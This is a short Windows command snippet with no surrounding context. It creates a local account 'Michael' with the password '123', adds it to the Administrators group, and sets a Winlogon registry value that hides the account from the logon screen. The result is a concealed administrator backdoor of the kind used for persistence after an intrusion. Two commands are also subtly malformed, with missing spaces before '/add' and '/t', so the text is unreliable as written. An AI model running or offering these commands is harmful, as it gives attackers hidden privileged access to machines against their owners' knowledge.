net user Michael 123 /add 
net localgroup Administrators Michael/add 
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v Michael/t REG_DWORD /d 0 /f 